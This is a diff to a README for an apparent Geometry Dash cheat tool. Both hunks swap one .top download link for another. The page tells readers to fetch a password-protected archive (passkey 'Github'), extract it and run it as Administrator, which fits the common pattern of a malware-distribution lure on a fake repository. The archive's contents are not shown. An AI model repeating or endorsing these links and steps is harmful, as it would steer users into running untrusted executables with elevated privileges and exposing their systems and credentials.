@@ -6,7 +6,7 @@ Geometry Dash external hack with noclip, speedhack, startpos switcher, hitbox vi
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top)**
 
 Archive passkey: `Github`
 
@@ -72,7 +72,7 @@ Based on popular mods like **OpenHack**, **Eclipse Menu**, and **QOLMod**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top)** to download.
 2. Extract the archive.
 3. Launch Geometry Dash.
 4. Run the hack **as Administrator**.
